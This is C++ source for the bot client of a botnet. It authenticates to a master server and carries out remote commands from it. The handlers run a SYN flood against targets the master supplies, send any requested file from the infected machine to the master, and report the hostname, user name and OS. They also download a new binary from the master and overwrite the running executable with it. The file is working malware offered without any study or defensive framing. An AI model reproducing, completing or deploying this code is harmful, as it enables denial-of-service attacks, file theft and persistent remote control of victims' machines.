#include "Bot.h"
#include "TCPFunctions.h"
#include "../defines.h"

#include <limits.h>
#include <iostream>
#include <fstream>
#include <string.h>
#include <pwd.h>
#include <sys/stat.h>

using namespace botnet;

// Init the server connection on port 0 to automaticly choose free port
Bot::Bot() : server_connection(0), continue_running(true) {
	
}

bool Bot::ConnectToMaster(const std::string& host, const std::string& port) {
	if (!this->server_connection.Connect(host, port)) {
		return false;
	}

	return this->AuthenticateServer();
}

void Bot::ListenToMaster() {
	if (!this->server_connection.isConnected()) {
		throw std::runtime_error("ListenToMaster(): Bot not connected to master");
	}

	std::string master_message;
	int retv = 0;
	while (this->continue_running) {
		// Wait for command from master
		retv = this->server_connection.Recv(master_message, sizeof(char));

		if (retv == sizeof(char)) {
			if (master_message[0] < 0 || master_message[0] >= ARG_CNT) {
				// On wrong code, flush the recv socket buffer.
				this->FlushIncoming();
			}
			else {
				Commands command = static_cast<Commands>(master_message[0]);
				(this->*GetCommandFunction(command))();
			}
		}
		// If master cut connection, quit
		else if (retv == 0) {
			this->continue_running = false;
		}
	}
}


void Bot::FlushIncoming() {
	std::string tmp;
	static const int KILOBYTE = 1024;

	// Read until not able to anymore
	while (this->server_connection.Recv(tmp, KILOBYTE, 0) > 0);
}

bool Bot::AuthenticateServer() {
	// alias AUTH_LEN for esthetic of code
	static const int auth_len = botnet_defines::AUTH_LEN;

	std::string server_auth;

	int try_cnt = 0;

	int retv = this->server_connection.Recv(server_auth, auth_len);
	if (retv == auth_len && server_auth == botnet_defines::SERVER_AUTH)	{
		while (try_cnt < 3) {
			if (this->server_connection.Send(botnet_defines::BOT_AUTH) == auth_len) {
				return true;
			}
			try_cnt++;
		}
	}

	return false;
}

/* Botnet command functions */

void Bot::KeepAlive() {
	static const char KEEP_ALIVE_CODE = static_cast<char>(Commands::KEEP_ALIVE);

	// Try to send 3 times
	int try_cnt = 0;
	while (try_cnt < 3) {
		if (this->server_connection.Send(static_cast<const void*>(&KEEP_ALIVE_CODE), sizeof(char)) == sizeof(char)) {
			break;
		}
		try_cnt++;
	}
}

void Bot::SYNFlood() {
	
	char                IP_to_flood[INET_ADDRSTRLEN] = { 0 };
	uint16_t            port_to_flood                =   0  ;
	static const double TIMEOUT                      =  2.5 ;

	if (this->server_connection.Recv(IP_to_flood, INET_ADDRSTRLEN, TIMEOUT) == INET_ADDRSTRLEN &&
		this->server_connection.Recv(&port_to_flood, sizeof(port_to_flood), TIMEOUT) == sizeof(port_to_flood))
	{
		port_to_flood = ntohs(port_to_flood);
		try {
			TCPFunctions::SendRawPacketData(IP_to_flood, port_to_flood, true, false, 10);
		}
		catch (const std::exception& e) {
			// On exception, abort
			return;
		}
	}
}

void Bot::GetFile() {
	static const size_t MAX_FILE_LENGTH = 64;
	static const double TIMEOUT = 2.5;

	static const char file_found     = 'Y';
	static const char file_not_found = 'N';

	std::string file_path;
	int retv = 0;

	if (this->server_connection.Recv(file_path, MAX_FILE_LENGTH, TIMEOUT) > 0) {
		std::ifstream file_to_send;
		file_to_send.open(file_path);
		
		// Check if have requested file
		if (file_to_send.is_open()) {
			retv = this->server_connection.Send(&file_found, sizeof(char));
		}
		else {
			retv = this->server_connection.Send(&file_not_found, sizeof(char));
			return;
		}

		if (retv != sizeof(char)) {
			// On fail, abort
			return;
		}
		
		/*---Send file size---*/
		struct stat st = { 0 };
		if (stat(file_path.c_str(), &st) == -1) {
			return;
		}
		uint32_t file_size = st.st_size;
		file_size = htonl(file_size);

		if (this->server_connection.Send(&file_size, sizeof(file_size)) != sizeof(file_size)) {
			return;
		}

		/*---Send file contents---*/
		std::string file_content((std::istreambuf_iterator<char>(file_to_send)),
			                     (std::istreambuf_iterator<char>()));

		this->server_connection.Send(file_content);
	}
}

void Bot::StopFlood() {
	;
}

void Bot::GetInfo() {
	std::string info;

	char host_name[HOST_NAME_MAX] = { 0 };

	struct passwd* pass;
	
	if (gethostname(host_name, HOST_NAME_MAX) == 0) {
		info += std::string("Host Name: ") + host_name + "\n";
	}

	if ((pass = getpwuid(getuid())) != nullptr) {
		info += std::string("Login Name: ") + pass->pw_name + "\n";
	}
	
	info += "OS: " + this->GetOsName() + "\n";


	this->server_connection.Send(info);
}

void Bot::UpdateBot() {
	
	static const std::string tmp_file_path = "BotUpdate.dnr";

	std::ofstream tmp_bot_file;
	char bot_file_path[PATH_MAX] = { 0 };

	// Get path of running bot
	if (readlink("/proc/self/exe", bot_file_path, PATH_MAX) == -1) {
		this->FlushIncoming();
		return;
	}

	tmp_bot_file.open(tmp_file_path, std::ios::binary | std::ios::out | std::ios::trunc);
	if (tmp_bot_file.bad()) {
		// Cleanup
		this->FlushIncoming();
		remove(tmp_file_path.c_str());
		return;
	}

	// Start receiving file from bot
	static const int    MAX_CHUNK = 5*1024; // 5kb at a time	
	static const double TIMEOUT   = 5;

	std::string file_content;
	uint32_t    left_to_read = 0;
	int         retv         = 0;

	retv = this->server_connection.Recv(&left_to_read, sizeof(left_to_read), TIMEOUT);

	if (retv != sizeof(left_to_read)) {
		// Cleanup
		this->FlushIncoming();
		remove(tmp_file_path.c_str());
		this->continue_running = (retv != 0);
		return;
	}
	
	left_to_read = ntohl(left_to_read);

	while (left_to_read > 0) {
		retv = this->server_connection.Recv(file_content, MAX_CHUNK, TIMEOUT);

		if (retv <= 0) {
			// Cleanup
			this->FlushIncoming();
			remove(tmp_file_path.c_str());
			this->continue_running = (retv != 0);
			return;
		}

		tmp_bot_file << file_content;
		left_to_read -= file_content.size();
	}

	static const char update_successful = 'Y';

	// If update not successful, don't send confirmation
	if (rename(tmp_file_path.c_str(), bot_file_path) == 0) {
		this->server_connection.Send(&update_successful, sizeof(update_successful));
		chmod(bot_file_path, S_IRUSR | S_IWUSR | S_IXUSR | S_IXGRP | S_IXOTH);
	}

	remove(tmp_file_path.c_str());
}


/* Botnet command function helpers */

std::string Bot::GetOsName() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __unix || __unix__
    return "Unix";
    #elif __APPLE__ || __MACH__
    return "Mac OSX";
    #elif __linux__
    return "Linux";
    #elif __FreeBSD__
    return "FreeBSD";
    #else
    return "Unkown";
    #endif
}